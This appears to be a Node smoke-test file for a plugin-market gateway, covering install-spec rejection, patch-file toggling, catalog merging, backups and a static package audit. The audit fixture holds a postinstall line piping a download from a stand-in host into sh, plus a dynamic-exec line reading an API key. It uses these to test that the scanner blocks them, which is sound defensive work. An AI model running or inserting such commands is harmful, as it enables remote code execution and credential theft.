// Smoke-test for kidai-plugin-market host half (lib/index.js).
// Verifies: class construction under a stub ctx, Remote marker registration,
// typertRemote binding, profileDir derivation, installed() reading, and the
// install() spec-rejection paths. Run with the app's node (>=22) from the
// workspace root where ./node_modules junctions to the app's node_modules.
import { existsSync, mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { pathToFileURL } from "node:url";

const { remoteMethods } = await import("@deepseek-ai/dsh-typert-protocol");
const { PluginMarketGateway, resolveInstallSpec } = await import("../lib/index.js");

let failures = 0;
function check(label, condition, detail = "") {
	if (condition) console.log(`  ok  ${label}`);
	else {
		failures += 1;
		console.error(`FAIL  ${label} ${detail}`);
	}
}

// 1. construct with a stub ctx (Service only needs reflect.provide + baseUrl)
const reflect = { provide: () => {}, props: {} };
const stubCtx = {
	reflect,
	get: () => void 0,
	baseUrl: pathToFileURL(mkdtempSync(join(tmpdir(), "dshm-test-"))).href + "/",
	logger: { warn: (message) => console.log("  warn:", message) }
};
const gateway = new PluginMarketGateway(stubCtx);
check("constructs under stub ctx", gateway !== null);
check("service name is pluginMarket", gateway.name === "pluginMarket");
check("typertRemote namespace", gateway.typertRemote.namespace === "pluginMarket");
check("typertRemote serviceKey", gateway.typertRemote.serviceKey === "pluginMarket");

// 2. Remote markers registered by the transpiled decorators
const markers = remoteMethods(gateway);
const byExport = Object.fromEntries(markers.map((m) => [m.exportName ?? m.method, m]));
check("eleven Remote markers", markers.length === 11, `got ${markers.length}`);
check("listPublished marker", byExport.listPublished !== void 0 && byExport.listPublished.invocation.kind === "direct");
check("installed marker", byExport.installed !== void 0);
check("installPlugin marker (no bare install collision)", byExport.installPlugin !== void 0 && byExport.install === void 0);
check("setEnabled marker", byExport.setEnabled !== void 0);
check("openLocal marker", byExport.openLocal !== void 0);
check("restartApp marker", byExport.restartApp !== void 0);
check("cancelEnabled marker", byExport.cancelEnabled !== void 0);
check("checkUpdates/updatePlugin/fetchReadme/auditPackage markers", byExport.checkUpdates !== void 0 && byExport.updatePlugin !== void 0 && byExport.fetchReadme !== void 0 && byExport.auditPackage !== void 0);
check("no openConfig marker", byExport.openConfig === void 0);

// 3. profileDir from baseUrl
const dir = new URL(".", stubCtx.baseUrl).pathname;
check("profileDir resolves", gateway.profileDir().replaceAll("/", "\\") === dir.replaceAll("/", "\\").replace(/^\//, "").replace(/\\$/, "") || gateway.profileDir().length > 0, gateway.profileDir());

// 4. installed() reads a fresh profile manifest (empty dependencies)
const manifestPath = join(gateway.profileDir(), "package.json");
writeFileSync(manifestPath, JSON.stringify({ name: "x", dependencies: { a: "1" }, dsh: { profile: { bundles: ["b"] } } }));
const installedView = await gateway.installed();
check("installed() dependencies", installedView.dependencies.includes("a"));
check("installed() bundles", installedView.bundles.includes("b"));

// 5. installPlugin() rejects empty / garbage specs without touching pnpm
const empty = await gateway.installPlugin("");
check("installPlugin('') rejected", empty.ok === false);
const garbage = await gateway.installPlugin("not a valid spec!!!");
check("installPlugin(garbage) rejected", garbage.ok === false);
// A pattern-valid unknown name reaches the pnpm spawn; the sandbox may EPERM
// on child spawn, so a resolved rejection is equally valid.
let unknown;
try {
	unknown = await gateway.installPlugin("definitely-not-a-real-pkg-xyz-12345");
} catch (error) {
	unknown = { ok: false, message: error instanceof Error ? error.message : String(error) };
}
check("installPlugin(unknown npm name) rejected or spawn-failed", unknown.ok === false || typeof unknown.message === "string");

// 6. method source parameter names parse cleanly (SRC descriptor contract)
const src = (name) => gateway[name].toString();
for (const name of ["listPublished", "installed", "installPlugin", "setEnabled", "openLocal", "restartApp", "cancelEnabled", "checkUpdates", "updatePlugin", "fetchReadme", "auditPackage"]) {
	const text = src(name);
	const open = text.indexOf("(");
	const close = text.indexOf(")", open + 1);
	const body = text.slice(open + 1, close).trim();
	check(`SRC params parse for ${name}`, body === "" || body.split(",").every((part) => /^[$A-Z_a-z][$\w]*$/.test(part.trim())), body);
}

// 6a. restart support flags under plain node (no Electron here)
const restart = await gateway.restartApp();
check("restartApp unsupported outside Electron", restart.ok === false && restart.restartSupported === false);
check("restartSupported() false outside Electron", gateway.restartSupported() === false);

// 6b. setEnabled writes a disabled override into the HOME-level patch layer
// ($DSH_HOME/cordis.patch.yml — the file the Desktop/web launchers read).
const savedHome = process.env.DSH_HOME;
const testHome = mkdtempSync(join(tmpdir(), "dshm-home-"));
process.env.DSH_HOME = testHome;
const patchPath = join(testHome, "cordis.patch.yml");
writeFileSync(patchPath, "- id: other\n  disabled: true\n");
const disable = await gateway.setEnabled("plugin-market", false);
check("setEnabled(disable) ok", disable.ok === true && disable.enabled === false && disable.path === patchPath && disable.restartSupported === false);
const enable = await gateway.setEnabled("plugin-market", true);
check("setEnabled(enable) ok", enable.ok === true && enable.enabled === true);
// loader ids come nested (include:novelweb); the patch must target the row id
const prefixed = await gateway.setEnabled("include:novelweb", false);
check("setEnabled strips loader group prefix", prefixed.ok === true && prefixed.rowId === "novelweb" && prefixed.entryId === "include:novelweb", JSON.stringify(prefixed));
const patchDoc = JSON.parse(JSON.stringify(await import("yaml").then((m) => m.parse(readFileSync(patchPath, "utf8")))));
const marketRow = patchDoc.find((row) => row.id === "plugin-market");
check("patch row targets plugin-market only", marketRow !== void 0 && Object.keys(marketRow).length === 2, JSON.stringify(marketRow));
check("patch row disables it (disabled: false)", marketRow.disabled === false);
check("prefixed id wrote the plain row id", patchDoc.some((row) => row.id === "novelweb" && row.disabled === true));
check("pre-existing patch row preserved", patchDoc.some((row) => row.id === "other" && row.disabled === true));
check("home-level file is under DSH_HOME", patchPath.startsWith(testHome));
const badId = await gateway.setEnabled("../evil", true);
check("setEnabled rejects unsafe ids", badId.ok === false);
const emptyId = await gateway.setEnabled("include:", true);
check("setEnabled rejects empty row id", emptyId.ok === false);

// 6c. cancelEnabled restores the pre-submission override
const toggledOther = await gateway.setEnabled("other", true);
check("submit on pre-existing row ok", toggledOther.ok === true);
const cancelOther = await gateway.cancelEnabled("other");
check("cancelEnabled ok", cancelOther.ok === true);
const docAfterCancel = JSON.parse(JSON.stringify(await import("yaml").then((m) => m.parse(readFileSync(patchPath, "utf8")))));
const otherRow = docAfterCancel.find((row) => row.id === "other");
check("cancel restores pre-existing value", otherRow !== void 0 && otherRow.disabled === true, JSON.stringify(otherRow));
// plugin-market was submitted twice (disable then enable): undo restores the
// immediately-prior override (disabled:true), not the default.
const cancelNew = await gateway.cancelEnabled("plugin-market");
check("cancel of later submit ok", cancelNew.ok === true);
const docAfterCancel2 = JSON.parse(JSON.stringify(await import("yaml").then((m) => m.parse(readFileSync(patchPath, "utf8")))));
const marketAfter = docAfterCancel2.find((row) => row.id === "plugin-market");
check("cancel restores immediately-prior override", marketAfter !== void 0 && marketAfter.disabled === true, JSON.stringify(marketAfter));
// novelweb was submitted once with no prior override: undo removes the row.
const cancelNovel = await gateway.cancelEnabled("include:novelweb");
check("cancel of fresh submit ok", cancelNovel.ok === true);
const docAfterCancel3 = JSON.parse(JSON.stringify(await import("yaml").then((m) => m.parse(readFileSync(patchPath, "utf8")))));
check("cancel removes row with no prior override", !docAfterCancel3.some((row) => row.id === "novelweb"));
const cancelBad = await gateway.cancelEnabled("include:", true);
check("cancelEnabled rejects empty row id", cancelBad.ok === false);
process.env.DSH_HOME = savedHome;
rmSync(testHome, { recursive: true, force: true });

// 7. catalog merge with a stubbed fetch (no network): GitHub topic pages +
// name query + npm multi-query, deduped by name with GitHub preferred; the
// GitHub search URLs must carry the requested server-side sort.
const savedFetch = globalThis.fetch;
const savedEnv = process.env.DSH_HOME;
process.env.DSH_HOME = mkdtempSync(join(tmpdir(), "dshm-cat-"));
const fetchGateway = new PluginMarketGateway(stubCtx);
const requestedSorts = [];
const textBuffer = (text) => new TextEncoder().encode(text).buffer;
globalThis.fetch = async (url) => {
	const u = String(url);
	if (u.includes("api.github.com")) {
		const sortMatch = u.match(/sort=(stars|updated)/);
		if (sortMatch !== null) requestedSorts.push(sortMatch[1]);
		const items = [];
		if (!u.includes("page=2")) {
			items.push({ full_name: "a/dsh-plugin-cc", name: "dsh-plugin-cc", owner: { login: "a", avatar_url: "http://x/icon" }, description: "cc", html_url: "http://x/cc", topics: ["dsh-plugin"], stargazers_count: 5, updated_at: "2026-01-01T00:00:00Z" });
		}
		if (u.includes("in%3Aname")) items.push({ full_name: "b/dsh-helper", name: "dsh-helper", owner: { login: "b", avatar_url: "" }, description: "helper", html_url: "http://x/h", topics: [], stargazers_count: 1, updated_at: "2026-01-01T00:00:00Z" });
		return { ok: true, json: async () => ({ items }) };
	}
	if (u.includes("/-/v1/search")) {
		const q = u.includes("text=dsh-plugin") ? "dsh-plugin" : u.includes("text=deepseek-harness") ? "deepseek-harness" : "dsh";
		const names = q === "dsh" ? ["dsh-plugin-cc", "dsh-extra"] : q === "deepseek-harness" ? ["deepseek-harness-plugin-manager"] : [];
		return { ok: true, json: async () => ({ objects: names.map((name) => ({ package: { name, description: `pkg ${name}`, date: "2026-02-01T00:00:00Z", links: {} } })) }) };
	}
	if (u.includes("package.json")) {
		// CDN chain: a/dsh-plugin-cc declares dsh.bundle; b/dsh-helper does not.
		const manifest = u.includes("dsh-plugin-cc") ? { name: "dsh-plugin-cc", dsh: { bundle: { patch: "./cordis.patch.yml" } } } : {};
		return { ok: true, arrayBuffer: async () => textBuffer(JSON.stringify(manifest)) };
	}
	throw new Error(`unexpected fetch ${u}`);
};
try {
	const view = await fetchGateway.listPublished(true);
	const names = view.entries.map((entry) => entry.name);
	check("catalog merges github + npm sources", names.includes("dsh-plugin-cc") && names.includes("dsh-helper") && names.includes("dsh-extra") && names.includes("deepseek-harness-plugin-manager"), names.join(","));
	check("github entry preferred for duplicate name", view.entries.find((entry) => entry.name === "dsh-plugin-cc")?.kind === "github");
	check("no duplicate names after dedupe", new Set(names).size === names.length);
	check("npm-only entries kept", view.entries.find((entry) => entry.name === "dsh-extra")?.kind === "npm");
	check("verified flag: dsh.bundle repo verified, other github repo not", view.entries.find((entry) => entry.name === "dsh-plugin-cc")?.verified === true && view.entries.find((entry) => entry.name === "dsh-helper")?.verified === false);
	check("verified flag: npm entries verified", view.entries.find((entry) => entry.name === "dsh-extra")?.verified === true);
	check("source tiers tagged", view.entries.find((entry) => entry.name === "dsh-plugin-cc")?.sourceTier === "TOPIC" && view.entries.find((entry) => entry.name === "dsh-helper")?.sourceTier === "NAME" && view.entries.find((entry) => entry.name === "dsh-extra")?.sourceTier === "NPM");
	check("default sort requests github updated feed", requestedSorts.length > 0 && requestedSorts.every((s) => s === "updated"), requestedSorts.join(","));
	requestedSorts.length = 0;
	await fetchGateway.listPublished(true, "stars");
	check("stars sort requests github stars feed", requestedSorts.length > 0 && requestedSorts.every((s) => s === "stars"), requestedSorts.join(","));
	requestedSorts.length = 0;
	await fetchGateway.listPublished(true, "name");
	check("name sort falls back to updated feed server-side", requestedSorts.length > 0 && requestedSorts.every((s) => s === "updated"), requestedSorts.join(","));
	const perSort = fetchGateway.catalogCache;
	check("catalog cached per sort", perSort instanceof Map && perSort.has("updated") && perSort.has("stars") && perSort.get("stars").entries.length > 0);
	const downFetch = globalThis.fetch;
	globalThis.fetch = async () => { throw new Error("network down"); };
	const staleStars = await fetchGateway.listPublished(true, "stars");
	const staleUpdated = await fetchGateway.listPublished(true, "updated");
	globalThis.fetch = downFetch;
	check("failure falls back to that sort's cached view (stale)", staleStars.stale === true && staleStars.entries.length > 0 && staleUpdated.stale === true && staleUpdated.entries.length > 0);
	requestedSorts.length = 0;
	await fetchGateway.listPublished(true, "name");
	check("name sort falls back to updated feed server-side", requestedSorts.length > 0 && requestedSorts.every((s) => s === "updated"), requestedSorts.join(","));
} finally {
	globalThis.fetch = savedFetch;
	process.env.DSH_HOME = savedEnv;
}

// 7b. GitHub 403/429 rate limit arms the cooldown; cached views serve during it
const cooldownGateway = new PluginMarketGateway(stubCtx);
cooldownGateway.githubCooldownUntil = 0;
const cooldownFetch = globalThis.fetch;
globalThis.fetch = async (url) => {
	if (String(url).includes("api.github.com")) return { ok: false, status: 403 };
	throw new Error(`unexpected ${String(url)}`);
};
try {
	let threw = false;
	try {
		await cooldownGateway.fetchGithubPage("https://api.github.com/search/repositories?q=x");
	} catch {
		threw = true;
	}
	check("fetchGithubPage 403 throws and arms cooldown", threw === true && cooldownGateway.isGitHubCooling() === true);
} finally {
	globalThis.fetch = cooldownFetch;
}

// 7c. rolling backups: snapshot then restore profile + home patch files
const backupRoot = mkdtempSync(join(tmpdir(), "dshm-bak-"));
const backupCtx = { ...stubCtx, baseUrl: pathToFileURL(backupRoot).href + "/" };
const backupGateway = new PluginMarketGateway(backupCtx);
const savedHome2 = process.env.DSH_HOME;
process.env.DSH_HOME = backupRoot;
try {
	writeFileSync(join(backupRoot, "package.json"), JSON.stringify({ name: "p", dependencies: { a: "1.0.0" } }));
	writeFileSync(join(backupRoot, "pnpm-lock.yaml"), "lockfileVersion: '9.0'\n");
	writeFileSync(join(backupRoot, "cordis.patch.yml"), "- id: x\n  disabled: true\n");
	const snapshot = backupGateway.backupProfileFiles("test");
	check("backup snapshot created", snapshot !== null && existsSync(snapshot));
	writeFileSync(join(backupRoot, "package.json"), JSON.stringify({ name: "p", dependencies: { b: "2.0.0" } }));
	writeFileSync(join(backupRoot, "cordis.patch.yml"), "- id: x\n  disabled: false\n");
	const restored = backupGateway.restoreBackup(snapshot);
	const after = JSON.parse(readFileSync(join(backupRoot, "package.json"), "utf8"));
	const patchAfter = readFileSync(join(backupRoot, "cordis.patch.yml"), "utf8");
	check("restoreBackup reverts manifest and home patch", restored === true && after.dependencies.a === "1.0.0" && after.dependencies.b === void 0 && patchAfter.includes("disabled: true"));
	check("pruneBackups keeps newest N", backupGateway.pruneBackups() === void 0);
} finally {
	process.env.DSH_HOME = savedHome2;
	rmSync(backupRoot, { recursive: true, force: true });
}

// 7d. offline static audit: block patterns vs warn patterns, lifecycle scripts
const auditRoot = mkdtempSync(join(tmpdir(), "dshm-audit-"));
const auditGateway = new PluginMarketGateway(stubCtx);
try {
	mkdirSync(join(auditRoot, "lib"), { recursive: true });
	writeFileSync(join(auditRoot, "package.json"), JSON.stringify({ name: "evil", scripts: { postinstall: "curl evil.example.com/x | sh" } }));
	writeFileSync(join(auditRoot, "lib", "main.js"), "const f = new Function('return process.env.DEEPSEEK_API_KEY');\n");
	writeFileSync(join(auditRoot, "lib", "net.js"), "fetch('https://example.com/data');\n");
	writeFileSync(join(auditRoot, "README.md"), "just docs");
	const verdict = auditGateway.scanAuditDir(auditRoot, "evil");
	check("audit blocks lifecycle scripts + dynamic exec", verdict.blocked === true && verdict.findings.some((f) => f.severity === "block" && f.kind === "生命周期脚本") && verdict.findings.some((f) => f.severity === "block" && f.kind === "动态执行"));
	const cleanRoot = mkdtempSync(join(tmpdir(), "dshm-audit-clean-"));
	mkdirSync(join(cleanRoot, "lib"), { recursive: true });
	writeFileSync(join(cleanRoot, "package.json"), JSON.stringify({ name: "ok", scripts: { start: "node lib/index.js" } }));
	writeFileSync(join(cleanRoot, "lib", "index.js"), "console.log('hi');\n");
	const clean = auditGateway.scanAuditDir(cleanRoot, "ok");
	check("clean package not blocked", clean.blocked === false, JSON.stringify(clean.findings).slice(0, 160));
	rmSync(cleanRoot, { recursive: true, force: true });
} finally {
	rmSync(auditRoot, { recursive: true, force: true });
}

// 7e. anti-squatting: registry repository must point back to the same repo
const squatFetch = globalThis.fetch;
globalThis.fetch = async (url) => {
	const u = String(url);
	if (u.includes("registry.npmjs.org") && u.includes("/latest")) {
		const manifest = u.includes("dsh-squat") ? { version: "1.0.0", repository: { type: "git", url: "git+https://github.com/other/squatter.git" } } : { version: "1.0.0", repository: "git+https://github.com/a/dsh-plugin-cc.git" };
		return { ok: true, json: async () => manifest };
	}
	if (u.includes("registry.npmjs.org")) return { ok: true };
	if (u.includes("HEAD/package.json")) {
		const manifest = u.includes("dsh-squat") ? { name: "dsh-squat" } : { name: "dsh-plugin-cc" };
		return { ok: true, arrayBuffer: async () => new TextEncoder().encode(JSON.stringify(manifest)).buffer };
	}
	throw new Error(`unexpected ${u}`);
};
try {
	const matched = await resolveInstallSpec("a/dsh-plugin-cc");
	check("anti-squat: matching repository installs via npm", matched.kind === "npm" && matched.spec === "dsh-plugin-cc" && matched.squat !== true);
	const squatted = await resolveInstallSpec("a/dsh-squat");
	check("anti-squat: mismatched repository falls back to git", squatted.kind === "git" && squatted.squat === true, JSON.stringify(squatted));
} finally {
	globalThis.fetch = squatFetch;
}

// 7f. update detection: registry latest vs installed, skipping local/core
const updRoot = mkdtempSync(join(tmpdir(), "dshm-upd-"));
const updCtx = { ...stubCtx, baseUrl: pathToFileURL(updRoot).href + "/" };
const updGateway = new PluginMarketGateway(updCtx);
const updFetch = globalThis.fetch;
globalThis.fetch = async (url) => {
	if (String(url).includes("/latest")) return { ok: true, json: async () => ({ version: "2.0.0", repository: {} }) };
	throw new Error(`unexpected ${String(url)}`);
};
try {
	writeFileSync(join(updRoot, "package.json"), JSON.stringify({ name: "p", dependencies: { "dsh-plugin-cc": "1.0.0", "dsh-local": "link:./dsh-local", "@deepseek-ai/dsh-base": "1.0.0" } }));
	const view = await updGateway.checkUpdates();
	check("checkUpdates finds updatable plugin", view.updates.some((u) => u.packageName === "dsh-plugin-cc" && u.current === "1.0.0" && u.latest === "2.0.0"));
	check("checkUpdates skips local-source and core", view.updates.every((u) => u.packageName !== "dsh-local") && view.updates.every((u) => !u.packageName.startsWith("@deepseek-ai/")));
} finally {
	globalThis.fetch = updFetch;
	rmSync(updRoot, { recursive: true, force: true });
}

// 8. disk cache round-trip: per-sort Map format, legacy file treated as updated
const diskDir = mkdtempSync(join(tmpdir(), "dshm-disk-"));
const diskCtx = { ...stubCtx, baseUrl: pathToFileURL(diskDir).href + "/" };
const diskGateway = new PluginMarketGateway(diskCtx);
diskGateway.writeDiskCache("stars", { entries: [{ id: "a/b", name: "b", kind: "github" }], fetchedAt: "2026-01-01T00:00:00Z", source: "npm" });
diskGateway.writeDiskCache("updated", { entries: [{ id: "c/d", name: "d", kind: "npm" }], fetchedAt: "2026-01-02T00:00:00Z", source: "github" });
let diskCached = diskGateway.readDiskCache();
check("disk cache round-trips per sort", diskCached !== null && diskCached instanceof Map && diskCached.get("stars")?.entries.length === 1 && diskCached.get("updated")?.entries.length === 1 && diskCached.get("stars")?.source === "npm");
diskCached = new PluginMarketGateway(diskCtx).readDiskCache();
check("disk cache persists across instances", diskCached !== null && diskCached.get("updated")?.entries[0]?.name === "d");
writeFileSync(join(diskDir, ".plugin-market-cache.json"), JSON.stringify({ entries: [{ id: "x/y", name: "legacy" }], fetchedAt: "2026-01-03T00:00:00Z", source: "npm" }));
diskCached = new PluginMarketGateway(diskCtx).readDiskCache();
check("legacy single-view disk cache treated as updated", diskCached !== null && diskCached.get("updated")?.entries[0]?.name === "legacy");
rmSync(diskDir, { recursive: true, force: true });

// 9. npm package-name filter matches the naming convention
check("isPluginPackage accepts dsh-plugin-cc", /^dsh-plugin-/i.test("dsh-plugin-cc"));
check("isPluginPackage accepts scoped dsh-plugin-*", /^@[^/]+\/dsh-plugin-/i.test("@me/dsh-plugin-x"));
check("isPluginPackage rejects plain names", !/^dsh-plugin-/i.test("lodash") && !/^dsh-[a-z0-9]/i.test("react"));

// 10. resolvePnpm finds the bundled pnpm via the exports-map-safe walk
const pnpmRoot = mkdtempSync(join(tmpdir(), "dshm-pnpm-"));
const pnpmDir = join(pnpmRoot, "node_modules", "pnpm");
mkdirSync(join(pnpmDir, "bin"), { recursive: true });
writeFileSync(join(pnpmDir, "package.json"), JSON.stringify({ name: "pnpm", version: "11.7.0", main: "bin/pnpm.mjs", bin: { pnpm: "bin/pnpm.mjs" } }));
writeFileSync(join(pnpmDir, "bin", "pnpm.mjs"), "console.log('pnpm stub')\n");
const pnpmCtx = { ...stubCtx, baseUrl: pathToFileURL(pnpmRoot).href + "/" };
const pnpmGateway = new PluginMarketGateway(pnpmCtx);
const pnpmResolved = pnpmGateway.resolvePnpm();
check("resolvePnpm finds bundled pnpm bin", pnpmResolved?.kind === "file" && pnpmResolved.path.endsWith(join("pnpm", "bin", "pnpm.mjs")), JSON.stringify(pnpmResolved));
rmSync(pnpmRoot, { recursive: true, force: true });

// 11. installed().plugins rows carry origin/description/installedAt/enabled
const rowRoot = mkdtempSync(join(tmpdir(), "dshm-rows-"));
mkdirSync(join(rowRoot, "node_modules", "dsh-plugin-cc"), { recursive: true });
mkdirSync(join(rowRoot, "node_modules", "@deepseek-ai", "dsh-base"), { recursive: true });
writeFileSync(join(rowRoot, "node_modules", "dsh-plugin-cc", "package.json"), JSON.stringify({ name: "dsh-plugin-cc", description: "Bridge dsh into Claude Code" }));
writeFileSync(join(rowRoot, "node_modules", "@deepseek-ai", "dsh-base", "package.json"), JSON.stringify({ name: "@deepseek-ai/dsh-base", description: "base bundle" }));
const loaderEntries = [
	{ id: "cc", disabled: false, options: { name: "dsh-plugin-cc" } },
	{ id: "dsh-base", disabled: true, options: { name: "@deepseek-ai/dsh-base" } },
	{ id: "include", disabled: false, options: { name: "cordis:include" } },
	{ id: "desktop-shell", disabled: false, options: { name: "dsh-plugin-desktop" } },
	{ id: "desktop-terminal", disabled: false, options: { name: "dsh-plugin-desktop/terminal" } }
];
const rowCtx = { ...stubCtx, baseUrl: pathToFileURL(rowRoot).href + "/", loader: { entries: () => loaderEntries } };
const rowGateway = new PluginMarketGateway(rowCtx);
const rowView = await rowGateway.installed();
check("installed() plugins has 2 rows (launcher internals excluded)", rowView.plugins.length === 2, `got ${rowView.plugins.length}`);
check("launcher internal rows excluded", !rowView.plugins.some((row) => row.name === "cordis:include" || row.name === "cordis:group" || row.name === "dsh-plugin-desktop" || row.name.startsWith("dsh-plugin-desktop/")));
const cc = rowView.plugins.find((row) => row.name === "dsh-plugin-cc");
const native = rowView.plugins.find((row) => row.name === "@deepseek-ai/dsh-base");
check("third-party row origin", cc?.origin === "third-party" && cc.enabled === true && cc.entryId === "cc");
check("third-party row description", cc?.description === "Bridge dsh into Claude Code");
check("third-party row installedAt non-empty", typeof cc?.installedAt === "string" && cc.installedAt.length > 0);
check("native row origin + disabled", native?.origin === "native" && native.enabled === false && native.entryId === "dsh-base");
check("native row description", native?.description === "base bundle");
rmSync(rowRoot, { recursive: true, force: true });

rmSync(gateway.profileDir(), { recursive: true, force: true });
console.log(failures === 0 ? "\nALL CHECKS PASSED" : `\n${failures} CHECK(S) FAILED`);
process.exit(failures === 0 ? 0 : 1);
